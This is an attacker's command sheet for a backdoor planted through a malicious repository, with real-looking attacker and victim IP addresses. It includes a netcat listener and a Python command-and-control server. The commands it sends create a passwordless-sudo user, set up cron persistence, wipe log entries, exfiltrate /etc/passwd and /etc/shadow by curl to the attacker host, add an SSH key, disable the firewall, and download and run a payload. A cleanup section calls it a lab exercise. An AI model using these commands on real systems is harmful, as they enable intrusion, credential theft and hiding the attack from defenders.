╔════════════════════════════════════════════════════════════════════════════╗
║                    ATTACKER COMMAND SHEET                                  ║
║                                                                            ║
║  Attacker VPS:  84.247.129.120                                            ║
║  Victim VPS:    84.247.162.93                                             ║
║  Port:          4444                                                       ║
╚════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════
PHASE 0: SETUP ATTACKER VPS (84.247.129.120)
═══════════════════════════════════════════════════════════════════════════════

# 1. SSH into attacker VPS
ssh root@84.247.129.120

# 2. Start netcat listener on port 4444
while true; do nc -lvnp 4444; done

# Alternative: More verbose listener with logging
while true; do nc -lvnp 4444 | tee -a /root/beacon_log.txt; done

# Keep this terminal open and running!


═══════════════════════════════════════════════════════════════════════════════
WHAT YOU'LL SEE IN THE LISTENER
═══════════════════════════════════════════════════════════════════════════════

When victim connects, you'll see HTTP POST requests like:

POST / HTTP/1.1
Host: 84.247.129.120:4444
User-Agent: curl/7.xxx
Accept: */*
X-Beacon: elk-siem-1730728934
X-Host: elk-siem
X-User: root
X-UID: 0
X-IP: 10.0.0.5/24
X-OS: Linux elk-siem 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

[Connection will close and reconnect every 5 minutes]


═══════════════════════════════════════════════════════════════════════════════
PHASE 1: AFTER FIRST BEACON (T+2 minutes)
═══════════════════════════════════════════════════════════════════════════════

You have confirmed the backdoor is working! The victim is beaconing to you.

Now wait for the SECOND beacon (5 minutes later) to send commands.


═══════════════════════════════════════════════════════════════════════════════
PHASE 2: SEND COMMANDS ON BEACON #2 (T+7 minutes)
═══════════════════════════════════════════════════════════════════════════════

The backdoor expects an HTTP response with commands to execute.

Since you're using basic netcat, you need to manually respond when the beacon comes in.

When you see the POST request, type this response (quickly before timeout):

HTTP/1.1 200 OK
Content-Type: text/plain

useradd -m -s /bin/bash -u 1337 sysupdate 2>/dev/null
echo "sysupdate:Sup3rS3cr3t!" | chpasswd 2>/dev/null
usermod -aG sudo sysupdate 2>/dev/null
echo "sysupdate ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
mkdir -p /home/sysupdate/.ssh 2>/dev/null
chmod 700 /home/sysupdate/.ssh 2>/dev/null

[Press Enter twice to send, then Ctrl+D or connection will close automatically]


═══════════════════════════════════════════════════════════════════════════════
PHASE 3: SEND PERSISTENCE ON BEACON #3 (T+12 minutes)
═══════════════════════════════════════════════════════════════════════════════

When next beacon arrives (5 min later), respond with:

HTTP/1.1 200 OK
Content-Type: text/plain

echo "*/5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1" >> /etc/crontab 2>/dev/null
systemctl restart cron 2>/dev/null

[Press Enter twice, then Ctrl+D]


═══════════════════════════════════════════════════════════════════════════════
PHASE 4: VERIFY BACKDOOR ACCESS (T+15 minutes)
═══════════════════════════════════════════════════════════════════════════════

# Open a NEW terminal/SSH session to victim
ssh sysupdate@84.247.162.93
Password: Sup3rS3cr3t!

# Once logged in as sysupdate:
whoami
# Output: sysupdate

id
# Output: uid=1337(sysupdate) gid=1337(sysupdate) groups=1337(sysupdate),27(sudo)

sudo -l
# Output: User sysupdate may run the following commands on elk-siem:
#     (ALL) NOPASSWD: ALL

# Test root access
sudo su -
whoami
# Output: root

# Check the backdoor is running
ps aux | grep sysupd
# Output: root ... /usr/local/bin/.sysupd

# Check cron persistence
cat /etc/crontab | grep sysupd
# Output: */5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1


═══════════════════════════════════════════════════════════════════════════════
PHASE 5: COVER TRACKS ON BEACON #5 (T+22 minutes)
═══════════════════════════════════════════════════════════════════════════════

When the 5th beacon arrives, send log tampering commands:

HTTP/1.1 200 OK
Content-Type: text/plain

sed -i '/\.sysupd/d' /var/log/syslog 2>/dev/null
sed -i '/sysupdate/d' /var/log/auth.log 2>/dev/null
history -c 2>/dev/null

[Press Enter twice, then Ctrl+D]


═══════════════════════════════════════════════════════════════════════════════
PHASE 6: ADDITIONAL POST-EXPLOITATION COMMANDS
═══════════════════════════════════════════════════════════════════════════════

On any future beacon, you can send additional commands:

# Exfiltrate /etc/passwd
HTTP/1.1 200 OK
Content-Type: text/plain

curl -X POST -d "$(cat /etc/passwd)" http://84.247.129.120:8080/exfil 2>/dev/null


# Exfiltrate /etc/shadow (requires root)
HTTP/1.1 200 OK
Content-Type: text/plain

curl -X POST -d "$(sudo cat /etc/shadow)" http://84.247.129.120:8080/exfil 2>/dev/null


# Install additional tools
HTTP/1.1 200 OK
Content-Type: text/plain

apt-get update -qq 2>/dev/null && apt-get install -y nmap 2>/dev/null


# Create SSH backdoor
HTTP/1.1 200 OK
Content-Type: text/plain

echo "ssh-rsa AAAAB3NzaC1yc2EAAA... your-ssh-key" >> /root/.ssh/authorized_keys 2>/dev/null


# Disable firewall
HTTP/1.1 200 OK
Content-Type: text/plain

ufw disable 2>/dev/null


# Download and execute additional payloads
HTTP/1.1 200 OK
Content-Type: text/plain

wget http://84.247.129.120:8000/payload.sh -O /tmp/p.sh 2>/dev/null && bash /tmp/p.sh 2>/dev/null


═══════════════════════════════════════════════════════════════════════════════
EASIER ALTERNATIVE: USE PYTHON HTTP SERVER AS C2
═══════════════════════════════════════════════════════════════════════════════

Instead of manually typing responses in netcat, use this simple Python server:

# On attacker VPS (84.247.129.120)
cat > /root/simple_c2.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class C2(BaseHTTPRequestHandler):
    beacon_count = {}
    
    def do_POST(self):
        beacon = self.headers.get('X-Beacon', 'unknown')
        hostname = self.headers.get('X-Host', 'unknown')
        user = self.headers.get('X-User', 'unknown')
        
        if beacon not in self.beacon_count:
            self.beacon_count[beacon] = 0
        self.beacon_count[beacon] += 1
        count = self.beacon_count[beacon]
        
        print(f"\n[BEACON #{count}] {hostname} ({user}) - {beacon}")
        
        cmd = ""
        if count == 2:
            cmd = '''useradd -m -s /bin/bash -u 1337 sysupdate 2>/dev/null
echo "sysupdate:Sup3rS3cr3t!" | chpasswd 2>/dev/null
usermod -aG sudo sysupdate 2>/dev/null
echo "sysupdate ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null'''
            print(f"[SENDING] User creation commands")
        elif count == 3:
            cmd = '''echo "*/5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1" >> /etc/crontab
systemctl restart cron 2>/dev/null'''
            print(f"[SENDING] Persistence commands")
        elif count == 5:
            cmd = '''sed -i '/\.sysupd/d' /var/log/syslog 2>/dev/null
sed -i '/sysupdate/d' /var/log/auth.log 2>/dev/null'''
            print(f"[SENDING] Log tampering commands")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(cmd.encode())

if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 4444), C2).serve_forever()
EOF

python3 /root/simple_c2.py

# This will automatically send the right commands at the right time!


═══════════════════════════════════════════════════════════════════════════════
VERIFICATION COMMANDS (On Victim VPS)
═══════════════════════════════════════════════════════════════════════════════

# Check if backdoor file exists
ls -la /usr/local/bin/.sysupd

# Check if backdoor is running
ps aux | grep -v grep | grep sysupd

# Check backdoor user
cat /etc/passwd | grep sysupdate

# Check sudo permissions
cat /etc/sudoers | grep sysupdate

# Check cron persistence
cat /etc/crontab | grep sysupd

# Check network connections to attacker
netstat -antp | grep 84.247.129.120

# Check auth logs for user creation
grep sysupdate /var/log/auth.log

# Check syslog for backdoor activity
grep sysupd /var/log/syslog


═══════════════════════════════════════════════════════════════════════════════
TIMELINE SUMMARY
═══════════════════════════════════════════════════════════════════════════════

T+0 min   │ Victim clones malicious repo
T+1 min   │ install.sh runs → health-check.sh executes
          │ Backdoor deployed to /usr/local/bin/.sysupd
T+2 min   │ ★ BEACON #1 - First connection to attacker
          │ [Send empty response or just let it close]
T+7 min   │ ★ BEACON #2 - Send user creation commands
T+12 min  │ ★ BEACON #3 - Send persistence commands
T+17 min  │ ★ BEACON #4 - No commands (optional)
T+22 min  │ ★ BEACON #5 - Send log tampering commands
T+27+ min │ ★ BEACON #6+ - Ongoing C2, send any commands
          │ Every 5 minutes forever...


═══════════════════════════════════════════════════════════════════════════════
CLEANUP (After Lab Exercise)
═══════════════════════════════════════════════════════════════════════════════

# On victim VPS (84.247.162.93)
pkill -f .sysupd
rm -f /usr/local/bin/.sysupd
userdel -r sysupdate
sed -i '/\.sysupd/d' /etc/crontab
sed -i '/sysupdate/d' /etc/sudoers
systemctl restart cron
rm -rf /opt/linux-sysadmin-toolkit


═══════════════════════════════════════════════════════════════════════════════